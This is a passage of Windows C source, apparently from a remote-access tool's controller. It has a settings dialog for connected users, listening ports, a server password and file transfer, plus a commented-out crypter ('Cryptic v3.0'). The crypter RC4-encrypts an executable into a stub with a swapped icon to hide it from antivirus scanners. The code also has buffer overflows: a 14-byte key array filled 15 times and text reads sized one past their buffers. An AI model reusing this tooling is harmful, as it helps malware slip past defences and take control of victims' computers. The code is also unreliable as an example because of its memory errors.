    lpgid = (LPGRPICONDIR)realloc(lpgid, (sizeof(WORD) * 3) + (sizeof(GRPICONDIRENTRY) * lpgid->idCount));
    if(lpgid == NULL)
    {
        return FALSE;
    }
    for(int i = 0; i < lpgid->idCount; i++)
    {
        lpgid->idEntries[i].bWidth = lpid->idEntries[i].bWidth;
        lpgid->idEntries[i].bHeight = lpid->idEntries[i].bHeight;
        lpgid->idEntries[i].bColorCount = lpid->idEntries[i].bColorCount;
        lpgid->idEntries[i].bReserved = lpid->idEntries[i].bReserved;
        lpgid->idEntries[i].wPlanes = lpid->idEntries[i].wPlanes;
        lpgid->idEntries[i].wBitCount = lpid->idEntries[i].wBitCount;
        lpgid->idEntries[i].dwBytesInRes = lpid->idEntries[i].dwBytesInRes;
        lpgid->idEntries[i].nID = i + 1;
    }
    HANDLE hUpdate;
    hUpdate = BeginUpdateResource(szEFileName, TRUE);
    if(hUpdate == NULL)
    {
        CloseHandle(hFile);
        return FALSE;
    }
    for(int i = 0; i < lpid->idCount; i++)
    {
        LPBYTE lpBuffer = (LPBYTE)malloc(lpid->idEntries[i].dwBytesInRes);
        if(lpBuffer == NULL)
        {
            CloseHandle(hFile);
            return FALSE;
        }
        SetFilePointer(hFile, lpid->idEntries[i].dwImageOffset, NULL, FILE_BEGIN);
        ReadFile(hFile, lpBuffer, lpid->idEntries[i].dwBytesInRes, &dwBytesRead, NULL);
        if(UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(lpgid->idEntries[i].nID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), &lpBuffer[0], lpid->idEntries[i].dwBytesInRes) == FALSE)
        {
            CloseHandle(hFile);
            free(lpBuffer);
            return FALSE;
        }
        free(lpBuffer);
    }
    CloseHandle(hFile);
    if(UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), &lpgid[0], (sizeof(WORD) * 3) + (sizeof(GRPICONDIRENTRY) * lpgid->idCount)) == FALSE)
    {
        return FALSE;
    }
    if(EndUpdateResource(hUpdate, FALSE) == FALSE)
    {
        return FALSE;
    }
    return TRUE;
}

/*LPBYTE RC4(LPBYTE lpBuf, LPBYTE lpKey, DWORD dwBufLen, DWORD dwKeyLen)
{
    int a, b = 0, s[256];
    BYTE swap;
    DWORD dwCount;
    for(a = 0; a < 256; a++)
    {
        s[a] = a;
    }
    for(a = 0; a < 256; a++)
    {
        b = (b + s[a] + lpKey[a % dwKeyLen]) % 256;
        swap = s[a];
        s[a] = s[b];
        s[b] = swap;
    }
    for(dwCount = 0; dwCount < dwBufLen; dwCount++)
    {
        a = (a + 1) % 256;
        b = (b + s[a]) % 256;
        swap = s[a];
        s[a] = s[b];
        s[b] = swap;
        lpBuf[dwCount] ^= s[(s[a] + s[b]) % 256];
    }
    return lpBuf;
}*/

VOID EnableControls(HWND hWnd, BOOL bEnable)
{
    EnableWindow(GetDlgItem(hWnd, IDC_FILE), bEnable);
    EnableWindow(GetDlgItem(hWnd, IDC_BROWSE), bEnable);
    EnableWindow(GetDlgItem(hWnd, IDC_BACKUP), bEnable);
    EnableWindow(GetDlgItem(hWnd, IDC_ADDICON), bEnable);
    EnableWindow(GetDlgItem(hWnd, IDC_ICONIMG), bEnable);
    EnableWindow(GetDlgItem(hWnd, IDC_BUILD), bEnable);
    EnableWindow(GetDlgItem(hWnd, IDC_DOWNLOAD_FILE), bEnable);
    //EnableWindow(GetDlgItem(hWnd, IDC_EXIT), bEnable);
}




/*BOOL CALLBACK EditProc2(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    OPENFILENAME ofn;
    POINT pt;
    RECT rect;
    switch(uMsg)
    {
    case WM_INITDIALOG:
        InitCommonControls();
        //hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_MAIN));
        //SendMessage(hDlg, WM_SETICON, (WPARAM)ICON_SMALL, (LPARAM)hIcon);
        CheckDlgButton(hDlg, IDC_BACKUP, BST_CHECKED);
        SendMessage(GetDlgItem(hDlg, IDC_FILE), EM_SETREADONLY, (WPARAM)TRUE, (LPARAM)0);
        hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_EXE));
        SendMessage(GetDlgItem(hDlg, IDC_ICONIMG), STM_SETICON, (WPARAM)hIcon, (LPARAM)0);
        EnableWindow(GetDlgItem(hDlg, IDC_BUILD), FALSE);
        SetWindowPos(hDlg, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        break;
    case WM_CLOSE:
        EndDialog(hDlg, 0);
        break;
    case WM_PAINT:
        SendMessage(GetDlgItem(hDlg, IDC_ICONIMG), STM_SETICON, (WPARAM)hIcon, (LPARAM)0);
        break;
    case WM_DROPFILES:
        HDROP hDrop;
        hDrop = HDROP(wParam);
        DragQueryFile(hDrop, 0, szEFileName, sizeof(szEFileName));
        DragFinish(hDrop);
        if(LoadPE(szEFileName) == FALSE)
        {
            MessageBox(hDlg, "Could not load file!", "Cryptic", MB_ICONERROR);
            return TRUE;
        }
        SetDlgItemText(hDlg, IDC_FILE, szEFileName);
        EnableWindow(GetDlgItem(hDlg, IDC_BUILD), TRUE);
        break;
    case WM_MOUSEMOVE:
        GetCursorPos(&pt);
        GetWindowRect(GetDlgItem(hDlg, IDC_ICONIMG), &rect);
        if(PtInRect(&rect, pt))
        {
            SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
        }
        else
        {
            SetCursor(LoadCursor(NULL, IDC_ARROW));
        }
        break;
    case WM_LBUTTONDOWN:
        GetCursorPos(&pt);
        GetWindowRect(GetDlgItem(hDlg, IDC_ICONIMG), &rect);
        if(PtInRect(&rect, pt))
        {
            SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
            memset(&ofn, 0, sizeof(ofn));
            szIFileName[0] = '\0';
            ofn.lStructSize = sizeof(OPENFILENAME);
            ofn.hwndOwner = hDlg;
            ofn.lpstrFilter = "Icon Files (*.ico)\0*.ico\0\0";
            ofn.lpstrFile = szIFileName;
            ofn.nMaxFile = MAX_PATH;
            ofn.Flags = OFN_PATHMUSTEXIST;
            if(GetOpenFileName(&ofn))
            {
                hIcon = ExtractIcon(hInst, szIFileName, 0);
                SendMessage(GetDlgItem(hDlg, IDC_ICONIMG), STM_SETICON, (WPARAM)hIcon, (LPARAM)0);
            }
        }
        break;
    case WM_RBUTTONDOWN:
        GetCursorPos(&pt);
        GetWindowRect(GetDlgItem(hDlg, IDC_ICONIMG), &rect);
        if(PtInRect(&rect, pt))
        {
            SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
        }
        break;
    case WM_COMMAND:
        switch LOWORD(wParam)
        {
        case IDC_BROWSE:
            memset(&ofn, 0, sizeof(ofn));
            szEFileName[0] = '\0';
            ofn.lStructSize = sizeof(OPENFILENAME);
            ofn.hwndOwner = hDlg;
            ofn.lpstrFilter = "Executable Files (*.exe)\0*.exe\0\0";
            ofn.lpstrFile = szEFileName;
            ofn.nMaxFile = MAX_PATH;
            ofn.Flags = OFN_PATHMUSTEXIST;
            if(GetOpenFileName(&ofn))
            {
                if(LoadPE(szEFileName) == FALSE)
                {
                    MessageBox(hDlg, "Could not load file!", "Cryptic", MB_ICONERROR);
                    return TRUE;
                }
                SetDlgItemText(hDlg, IDC_FILE, szEFileName);
                EnableWindow(GetDlgItem(hDlg, IDC_BUILD), TRUE);
            }
            break;
        case IDC_BUILD:
            EnableControls(hDlg, FALSE);
            HRSRC hRsrc;
            hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_STUB), "STUB");
            if(hRsrc == NULL)
            {
                MessageBox(hDlg, "Could not find resource!", "Cryptic", MB_ICONERROR);
                EnableControls(hDlg, TRUE);
                return TRUE;
            }
            DWORD dwRsrcSize;
            dwRsrcSize = SizeofResource(NULL, hRsrc);
            HGLOBAL hGlob;
            hGlob = LoadResource(NULL, hRsrc);
            if(hGlob == NULL)
            {
                MessageBox(hDlg, "Could not load resource!", "Cryptic", MB_ICONERROR);
                EnableControls(hDlg, TRUE);
                return TRUE;
            }
            LPBYTE lpBuffer;
            lpBuffer = (LPBYTE)LockResource(hGlob);
            if(lpBuffer == NULL)
            {
                MessageBox(hDlg, "Could not lock resource!", "Cryptic", MB_ICONERROR);
                EnableControls(hDlg, TRUE);
                return TRUE;
            }
            GetDlgItemText(hDlg, IDC_FILE, szEFileName, MAX_PATH);
            if(IsDlgButtonChecked(hDlg, IDC_BACKUP) == BST_CHECKED)
            {
                CHAR szBFileName[MAX_PATH];
                GetDlgItemText(hDlg, IDC_FILE, szBFileName, MAX_PATH);
                strcat(szBFileName, ".bak");
                if(CopyFile(szEFileName, szBFileName, FALSE) == 0)
                {
                    free(lpBuffer);
                    MessageBox(hDlg, "Could not copy file!", "Cryptic", MB_ICONERROR);
                    EnableControls(hDlg, TRUE);
                    return TRUE;
                }
            }
            BYTE lpKey[14];
            srand(time(NULL));
            int i;
            for(i = 0; i < 15; i++)
            {
                lpKey[i] = BYTE(rand() % 255 + 1);
            }
            HANDLE hFile;
            hFile = CreateFile(szEFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
            if(hFile == INVALID_HANDLE_VALUE)
            {
                free(lpBuffer);
                MessageBox(hDlg, "Could not create file!", "Cryptic", MB_ICONERROR);
                EnableControls(hDlg, TRUE);
                return TRUE;
            }
            DWORD dwBytesWritten;
            if(WriteFile(hFile, lpBuffer, dwRsrcSize, &dwBytesWritten, NULL) == 0)
            {
                CloseHandle(hFile);
                free(lpBuffer);
                MessageBox(hDlg, "Could not write to file!", "Cryptic", MB_ICONERROR);
                EnableControls(hDlg, TRUE);
                return TRUE;
            }
            CloseHandle(hFile);
            free(lpBuffer);
            if(IsDlgButtonChecked(hDlg, IDC_ADDICON) == BST_CHECKED)
            {
                if(AddIcon(szIFileName, szEFileName) == FALSE)
                {
                    MessageBox(hDlg, "Could add icon!", "Cryptic", MB_ICONERROR);
                    EnableControls(hDlg, TRUE);
                    return TRUE;
                }
            }
            HANDLE hUpdate;
            hUpdate = BeginUpdateResource(szEFileName, FALSE);
            if(hUpdate == NULL)
            {
                MessageBox(hDlg, "Could add resource!", "Cryptic", MB_ICONERROR);
                EnableControls(hDlg, TRUE);
                return TRUE;
            }
            if(UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(150), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), RC4(lpFileBuffer, lpKey, dwFileSize, 15), dwFileSize) == FALSE)
            {
                MessageBox(hDlg, "Could add resource!", "Cryptic", MB_ICONERROR);
                EnableControls(hDlg, TRUE);
                return TRUE;
            }
            if(UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(151), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), &lpKey[0], 15) == FALSE)
            {
                MessageBox(hDlg, "Could add resource!", "Cryptic", MB_ICONERROR);
                EnableControls(hDlg, TRUE);
                return TRUE;
            }
            if(EndUpdateResource(hUpdate, FALSE) == FALSE)
            {
                MessageBox(hDlg, "Could add resource!", "Cryptic", MB_ICONERROR);
                EnableControls(hDlg, TRUE);
                return TRUE;
            }
            RC4(lpFileBuffer, lpKey, dwFileSize, 15);
            pish = (PIMAGE_SECTION_HEADER)&lpFileBuffer[pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * (pinh->FileHeader.NumberOfSections - 1)];
            if(dwFileSize > (pish->PointerToRawData + pish->SizeOfRawData))
            {
                MessageBox(hDlg, "EOF data found!", "Cryptic", MB_OK);
                hFile = CreateFile(szEFileName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                if(hFile == INVALID_HANDLE_VALUE)
                {
                    MessageBox(hDlg, "Could not open file!", "Cryptic", MB_ICONERROR);
                    EnableControls(hDlg, TRUE);
                    return TRUE;
                }
                SetFilePointer(hFile, 0, NULL, FILE_END);
                if(WriteFile(hFile, &lpFileBuffer[pish->PointerToRawData + pish->SizeOfRawData + 1], dwFileSize - (pish->PointerToRawData + pish->SizeOfRawData), &dwBytesWritten, NULL) == 0)
                {
                    CloseHandle(hFile);
                    MessageBox(hDlg, "Could not write to file!", "Cryptic", MB_ICONERROR);
                    EnableControls(hDlg, TRUE);
                    return TRUE;
                }
                CloseHandle(hFile);
            }
            MessageBox(hDlg, "File successfully crypted!", "Cryptic", MB_ICONINFORMATION);
            EnableControls(hDlg, TRUE);
            break;
            		case IDC_ABOUT:
            			MessageBox(hDlg, "Cryptic v3.0\nCoded by Tughack", "About", MB_ICONINFORMATION);
            			break;
            		case IDC_EXIT:
            			EndDialog(hDlg, 0);
            			break;
        }
    }
    return FALSE;
}*/





LRESULT CALLBACK SettingProc(HWND hwndSEDlg, UINT msg, WPARAM wParam, LPARAM lParam)
{
    char dlfilepath[256];
    char RefTime[5];
    HWND hCombo;


    switch(msg)
    {
    case WM_INITDIALOG:
    {


        GetSettingsDatabase();

        hCombo = GetDlgItem ( hwndSEDlg, IDC_REFRESHTIME );

        // And add some information to it
        //SendMessage ( hCombo, CB_ADDSTRING, 0, ( LPARAM ) "3 mins" );
        SendMessage ( hCombo, CB_ADDSTRING, 0, ( LPARAM ) "15 mins" );
        SendMessage ( hCombo, CB_ADDSTRING, 0, ( LPARAM ) "30 mins" );
        SendMessage ( hCombo, CB_ADDSTRING, 0, ( LPARAM ) "60 mins" );

        // Then we select the first string in the combo box :-)


        SendMessage(hwndSEDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
        SendMessage(hwndSEDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));



        EnableWindow(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH), FALSE);
        EnableWindow(GetDlgItem(hwndSEDlg, IDC_DL_PATHBUTTON), FALSE);

        STabControl = GetDlgItem(hwndSEDlg,SETTING_TAB);


        TCITEM tie;
        /*ti.mask = TCIF_TEXT | TCIF_IMAGE; // I'm only having text on the tab
        ti.pszText = "USERS";
        TabCtrl_InsertItem(MTabControl,0,&ti);
        ti.pszText = "SETTINGS";
        TabCtrl_InsertItem(MTabControl,1,&ti);*/

        tie.mask = TCIF_TEXT | TCIF_IMAGE;
        tie.pszText = "General";
        TabCtrl_InsertItem(GetDlgItem(hwndSEDlg, SETTING_TAB), 0, &tie);

        tie.mask = TCIF_TEXT | TCIF_IMAGE;
        tie.pszText = "Network";
        TabCtrl_InsertItem(GetDlgItem(hwndSEDlg, SETTING_TAB), 1, &tie);



        tie.mask = TCIF_TEXT | TCIF_IMAGE;
        tie.pszText = "File Transfer";
        TabCtrl_InsertItem(GetDlgItem(hwndSEDlg, SETTING_TAB), 2, &tie);

        TabCtrl_SetCurSel(STabControl,0);


        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC0 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC1 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, ID_MAINPORT_EDIT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC2 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC3 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SET_OK_BUTTON ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC4 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_DL_PATHBUTTON ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_KEEP_DLOG ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SAVE_DPATH1 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SAVE_DPATH2 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SHOW_DLPROG ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SETPORTS_MANUAL ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SETPORTS_AUTO ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC5 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_NOT_NEWUSR ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_REFRESH_USR ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC6 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_AUTO_LISTEN ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC7 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SERV_PASSEDT ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_REFRESHTIME ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC8 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_ONE_INSTANCE ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndSEDlg, IDC_SHOW_ULPROG ),SW_HIDE);




        if(atoi(NotifyConnDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_NOT_NEWUSR,BST_CHECKED);
        }

        else
        {

        }

        if(atoi(RefreshUsrDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_REFRESH_USR,BST_CHECKED);
            EnableWindow(GetDlgItem(hwndSEDlg, IDC_REFRESHTIME), TRUE);

           if(strstr(RefTimeDB,"15"))
           {
            SendMessage ( hCombo, CB_SETCURSEL, 0, 0 );
           }

           if(strstr(RefTimeDB,"30"))
           {
            SendMessage ( hCombo, CB_SETCURSEL, 1, 0 );
           }

           if(strstr(RefTimeDB,"60"))
           {
            SendMessage ( hCombo, CB_SETCURSEL, 2, 0 );
           }


        }

        else
        {
          SendMessage ( hCombo, CB_SETCURSEL, 1, 0 );
          EnableWindow(GetDlgItem(hwndSEDlg, IDC_REFRESHTIME), FALSE);
        }

        if(atoi(AutoListenDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_AUTO_LISTEN,BST_CHECKED);
        }

        else
        {

        }


        if(atoi(DLPathONDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_SAVE_DPATH1,BST_CHECKED);
            EnableWindow(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH), TRUE);
            EnableWindow(GetDlgItem(hwndSEDlg, IDC_DL_PATHBUTTON), TRUE);
        }

        else
        {

        }

        if(atoi(DLPathOFFDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_SAVE_DPATH2,BST_CHECKED);
        }

        else
        {

        }


        if(atoi(ShowDLDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_SHOW_DLPROG,BST_CHECKED);
        }

        else
        {

        }

        if(atoi(KeepDlLogDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_KEEP_DLOG,BST_CHECKED);
        }

        else
        {

        }

        if(atoi(AutoPortDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_SETPORTS_AUTO,BST_CHECKED);
            EnableWindow(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT), FALSE);
            EnableWindow(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT), FALSE);
        }

        else
        {

        }

        if(atoi(ManPortDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_SETPORTS_MANUAL,BST_CHECKED);
            EnableWindow(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT), TRUE);
            EnableWindow(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT), TRUE);
        }

        else
        {

        }


        if(atoi(ShowULDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_SHOW_ULPROG,BST_CHECKED);
        }

        else
        {

        }

        if(atoi(InstanceDB)==1)
        {
            CheckDlgButton(hwndSEDlg,IDC_ONE_INSTANCE,BST_CHECKED);
        }

        else
        {

        }



        HWND button1 =  GetDlgItem(hwndSEDlg,IDC_SET_OK_BUTTON);
        HANDLE hIBitMap = LoadImage(GetModuleHandle(NULL),MAKEINTRESOURCE(IDB_SAVE),IMAGE_BITMAP,14,12,LR_DEFAULTCOLOR);
        SendMessage(button1,BM_SETIMAGE,IMAGE_BITMAP,(LPARAM)hIBitMap);

        GetSockDataBase();

        sprintf(MPort, "%s", getsockDBport1);

        if(strstr(isAutoPort,"OFF"))
        {
            sprintf(UPort, "%s", getsockDBport2);
            sprintf(FPort, "%s", getsockDBport3);

            SetWindowText(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT), UPort);
            SetWindowText(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT), FPort);
        }


        SetWindowText(GetDlgItem(hwndSEDlg, ID_MAINPORT_EDIT), MPort);
        //SetWindowText(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT), UPort);
        //SetWindowText(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT), FPort);
        SetWindowText(GetDlgItem(hwndSEDlg, IDC_SERV_PASSEDT), CpassDB);
        SetWindowText(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH), DLPathDB);
    }
    return TRUE;

    case WM_CLOSE:
    {
        EndDialog(hwndSEDlg,0);
    }
    return TRUE;




  /*  case WM_CTLCOLORSTATIC:
    {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(355, 255, 255));
        //SetBkMode(hdcStatic, TRANSPARENT);
        return (LONG)g_hbrBackground;
    }
    break;*/




    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {


        case IDC_NOT_NEWUSR:
        {

            if(IsDlgButtonChecked(hwndSEDlg, IDC_NOT_NEWUSR) == BST_CHECKED)
            {
                strcpy(NotifyConnDB,"1");
            }

            else
            {
                strcpy(NotifyConnDB,"0");
            }
        }
        break;


        case IDC_REFRESH_USR:
        {
            if(IsDlgButtonChecked(hwndSEDlg, IDC_REFRESH_USR) == BST_CHECKED)
            {
                strcpy(RefreshUsrDB,"1");
                EnableWindow(GetDlgItem(hwndSEDlg, IDC_REFRESHTIME), TRUE);

            }

            else
            {
                strcpy(RefreshUsrDB,"0");
                EnableWindow(GetDlgItem(hwndSEDlg, IDC_REFRESHTIME), FALSE);
            }
        }
        break;


        case IDC_AUTO_LISTEN:
        {
            if(IsDlgButtonChecked(hwndSEDlg, IDC_AUTO_LISTEN) == BST_CHECKED)
            {
                strcpy(AutoListenDB,"1");
            }

            else
            {
                strcpy(AutoListenDB,"0");
            }
        }
        break;


        case IDC_SAVE_DPATH1:
        {
            if(IsDlgButtonChecked(hwndSEDlg,IDC_SAVE_DPATH1))
            {
              EnableWindow(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH), TRUE);
              EnableWindow(GetDlgItem(hwndSEDlg, IDC_DL_PATHBUTTON), TRUE);
              strcpy(DLPathONDB,"1");
              strcpy(DLPathOFFDB,"0");
            }



            /*else
            {
              EnableWindow(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH), FALSE);
              EnableWindow(GetDlgItem(hwndSEDlg, IDC_DL_PATHBUTTON), FALSE);
              strcpy(DLPathONDB,"0");
            }*/


        }
        break;


        case IDC_SAVE_DPATH2:
        {
            if(IsDlgButtonChecked(hwndSEDlg,IDC_SAVE_DPATH2))
            {
              EnableWindow(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH), FALSE);
              EnableWindow(GetDlgItem(hwndSEDlg, IDC_DL_PATHBUTTON), FALSE);
              strcpy(DLPathONDB,"0");
              strcpy(DLPathOFFDB,"1");
            }

           /* else
            {
                strcpy(DLPathOFFDB,"0");
            }*/
        }
        break;

        case IDC_SETPORTS_AUTO:
        {
            if(IsDlgButtonChecked(hwndSEDlg,IDC_SETPORTS_AUTO))
            {
              EnableWindow(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT), FALSE);
              EnableWindow(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT), FALSE);
              strcpy(ManPortDB,"0");
              strcpy(AutoPortDB,"1");
            }
        }
        break;


        case IDC_SETPORTS_MANUAL:
        {
            if(IsDlgButtonChecked(hwndSEDlg,IDC_SETPORTS_MANUAL))
            {
              EnableWindow(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT), TRUE);
              EnableWindow(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT), TRUE);
              strcpy(AutoPortDB,"0");
              strcpy(ManPortDB,"1");
            }
        }
        break;


        case IDC_SHOW_DLPROG:
        {
            if(IsDlgButtonChecked(hwndSEDlg, IDC_SHOW_DLPROG) == BST_CHECKED)
            {
              strcpy(ShowDLDB,"1");
            }

            else
            {
              strcpy(ShowDLDB,"0");
            }
        }
        break;


        case IDC_KEEP_DLOG:
        {
            if(IsDlgButtonChecked(hwndSEDlg, IDC_KEEP_DLOG) == BST_CHECKED)
            {
                strcpy(KeepDlLogDB,"1");
            }

            else
            {
                strcpy(KeepDlLogDB,"0");
            }
        }
        break;



        case IDC_ONE_INSTANCE:
        {
            if(IsDlgButtonChecked(hwndSEDlg, IDC_ONE_INSTANCE) == BST_CHECKED)
            {
                strcpy(InstanceDB,"1");
            }

            else
            {
                strcpy(InstanceDB,"0");
            }
        }
        break;


       case IDC_SHOW_ULPROG:
        {
            if(IsDlgButtonChecked(hwndSEDlg, IDC_SHOW_ULPROG) == BST_CHECKED)
            {
                strcpy(ShowULDB,"1");
            }

            else
            {
                strcpy(ShowULDB,"0");
            }
        }
        break;



        case IDC_DL_PATHBUTTON:
        {
        /*  OPENFILENAME ofn;
          memset(&ofn, 0, sizeof(ofn));
          dlfilepath[0] = '\0';
          ofn.lStructSize = sizeof(OPENFILENAME);
          ofn.hwndOwner = hwndSEDlg;
          ofn.lpstrFilter ="All Files (*.*)\0*.*\0";//"All Files (*.*)\0*.*\0";
          ofn.lpstrFile = dlfilepath;
          ofn.nMaxFile = MAX_PATH;
          ofn.Flags = OFN_PATHMUSTEXIST;


         if(GetOpenFileName(&ofn))
        {
          SetWindowText(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH), dlfilepath);
        }*/

        BROWSEINFO bInfo;
        bInfo.hwndOwner=hwndSEDlg;
        bInfo.pidlRoot=NULL;
        bInfo.pszDisplayName=dlfilepath;
        bInfo.lpszTitle="Select path";
        bInfo.ulFlags=BIF_RETURNONLYFSDIRS|BIF_NEWDIALOGSTYLE;
        bInfo.lpfn=NULL;
        bInfo.lParam=0;
        bInfo.iImage=-1;

        LPITEMIDLIST lpItem = SHBrowseForFolder(&bInfo);

        if(lpItem != NULL)
        {
            SHGetPathFromIDList(lpItem,dlfilepath);
            SetWindowText(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH), dlfilepath);
        }


        }
        break;


        case IDC_SET_OK_BUTTON:
        {
            char getmport[25];
            char getfport[25];
            char getdlport[25];
            char getdlpath[256];
            char getpass[30];
            BOOL bSuccess;


            /*    int len = GetWindowTextLength(GetDlgItem(hwndSEDlg, ID_MAINPORT_EDIT));
                if(len = 0)
                {
                  MessageBox(NULL,"Main port can't be NULL","ERROR",MB_OK | MB_ICONERROR);
                  break;
                }


                int len2 = GetWindowTextLength(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT));
                if(len2 = 0)
                {
                  MessageBox(NULL,"Utility port can't be NULL","ERROR",MB_OK | MB_ICONERROR);
                  break;
                }


                int len3 = GetWindowTextLength(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT));

                if(len3 = 0)
                {
                  MessageBox(NULL,"File port can't be NULL","ERROR",MB_OK | MB_ICONERROR);
                  break;
                }*/

 /* if(IsDlgButtonChecked(hwndSEDlg, IDC_SAVE_DPATH1) == BST_CHECKED)
  {

                int len = GetWindowTextLength(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH));
                if(len = 0)
                {
                  MessageBox(NULL,"File destination not specified","ERROR",MB_OK | MB_ICONERROR);
                  break;
                }
  }*/

            GetDlgItemText(hwndSEDlg, ID_MAINPORT_EDIT, getmport, sizeof(getmport) + 1);
            GetDlgItemText(hwndSEDlg, ID_UTILPORT_EDIT, getfport, sizeof(getfport) + 1);
            GetDlgItemText(hwndSEDlg, ID_UPLDLPORT_EDIT, getdlport, sizeof(getdlport) + 1);
            GetDlgItemText(hwndSEDlg, IDC_SERV_PASSEDT, getpass, sizeof(getpass) + 1);
            GetDlgItemText(hwndSEDlg, IDC_DOWNLOAD_PATH, getdlpath, sizeof(getdlpath) + 1);


            if(strlen(getmport) == 0)
            {
                MessageBox(NULL,"Main port can't be NULL","ERROR",MB_OK | MB_ICONERROR);
                return 0;
            }


if(IsDlgButtonChecked(hwndSEDlg, IDC_SETPORTS_MANUAL) == BST_CHECKED)
{

            if(strlen(getfport) == 0)
            {
                MessageBox(NULL,"Utility port can't be NULL","ERROR",MB_OK | MB_ICONERROR);
                return 0;
            }

            if(strlen(getdlport) == 0)
            {
                MessageBox(NULL,"File port can't be NULL","ERROR",MB_OK | MB_ICONERROR);
                return 0;
            }

            sprintf(UPort, "%s", getfport);
            sprintf(FPort, "%s", getdlport);
}

